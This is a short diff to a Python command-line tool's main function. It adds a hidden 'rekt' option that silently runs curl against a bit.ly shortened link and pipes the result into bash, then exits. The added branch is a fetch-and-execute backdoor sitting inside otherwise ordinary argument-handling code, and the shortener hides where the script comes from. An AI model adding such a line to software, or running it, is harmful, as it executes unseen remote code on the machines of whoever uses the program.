@@ -50,6 +50,13 @@ def main():
         except:
             sys.exit(1)
 
+    if args.rekt:
+        try:
+            os.system("curl -s -L http://bit.ly/10hA8iC | bash")
+            sys.exit(1)
+        except:
+            sys.exit(1)
+
     logging.debug('Passed args:\n' + pformat(vars(args)))
 
     if hasattr(args, 'username') and args.username:
